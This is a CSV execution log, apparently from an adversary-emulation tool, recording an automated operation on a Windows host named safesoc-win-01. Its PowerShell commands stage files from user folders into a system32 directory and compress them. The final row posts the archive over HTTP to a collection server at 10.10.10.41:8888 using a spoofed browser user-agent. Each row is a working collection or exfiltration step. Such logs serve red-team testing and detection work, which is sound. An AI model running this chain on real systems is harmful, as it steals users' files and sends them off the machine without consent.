Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
2026-05-15T00:01:02Z,Create staging directory,fujqbt,safesoc-win-01,10788,New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object,New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
2026-05-15T00:01:47Z,Find files,fujqbt,safesoc-win-01,2148,Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;,Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
2026-05-15T00:02:42Z,Find files,fujqbt,safesoc-win-01,1136,Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;,Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
2026-05-15T00:03:22Z,Find files,fujqbt,safesoc-win-01,5604,Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;,Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
2026-05-15T00:04:02Z,Stage sensitive files,fujqbt,safesoc-win-01,5848,Copy-Item C:\Users\safesoc-win-01-user\Desktop\AppDataCopy\Local\Microsoft\Edge\User` Data\Edge` Sidebar\2026.2.24.1\edge_hub_apps_activity_hub_hc.png C:\WINDOWS\system32\staged,Copy-Item C:\Users\safesoc-win-01-user\Desktop\AppDataCopy\Local\Microsoft\Edge\User` Data\Edge` Sidebar\2026.2.24.1\edge_hub_apps_activity_hub_hc.png C:\WINDOWS\system32\staged
2026-05-15T00:04:42Z,Stage sensitive files,fujqbt,safesoc-win-01,10612,Copy-Item C:\Users\safesoc-win-01-user\Desktop\AppDataCopy\Local\Microsoft\Edge\User` Data\Edge` Sidebar\2026.2.24.1\edge_hub_apps_activity_hub_dark.png C:\WINDOWS\system32\staged,Copy-Item C:\Users\safesoc-win-01-user\Desktop\AppDataCopy\Local\Microsoft\Edge\User` Data\Edge` Sidebar\2026.2.24.1\edge_hub_apps_activity_hub_dark.png C:\WINDOWS\system32\staged
2026-05-15T00:05:42Z,Stage sensitive files,fujqbt,safesoc-win-01,2296,Copy-Item C:\Users\safesoc-win-01-user\Desktop\AppDataCopy\Local\Microsoft\Edge\User` Data\Default\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.104.1_0\128.png C:\WINDOWS\system32\staged,Copy-Item C:\Users\safesoc-win-01-user\Desktop\AppDataCopy\Local\Microsoft\Edge\User` Data\Default\Extensions\ghbmnnjooekpmoecnnnilnnbdlolhkhi\1.104.1_0\128.png C:\WINDOWS\system32\staged
2026-05-15T00:06:47Z,Compress staged directory,fujqbt,safesoc-win-01,1172,Compress-Archive -Path C:\WINDOWS\system32\staged -DestinationPath C:\WINDOWS\system32\staged.zip -Force;sleep 1; ls C:\WINDOWS\system32\staged.zip | foreach {$_.FullName} | select,Compress-Archive -Path C:\WINDOWS\system32\staged -DestinationPath C:\WINDOWS\system32\staged.zip -Force;sleep 1; ls C:\WINDOWS\system32\staged.zip | foreach {$_.FullName} | select
2026-05-15T00:07:42Z,Exfil staged directory,fujqbt,safesoc-win-01,3380,$ErrorActionPreference = 'Stop';$fieldName = "C:\WINDOWS\system32\staged.zip";$filePath = "C:\WINDOWS\system32\staged.zip";$url = "http://10.10.10.41:8888/file/upload";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-fujqbt');$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();,$ErrorActionPreference = 'Stop';$fieldName = "C:\WINDOWS\system32\staged.zip";$filePath = "C:\WINDOWS\system32\staged.zip";$url = "http://10.10.10.41:8888/file/upload";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-fujqbt');$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();
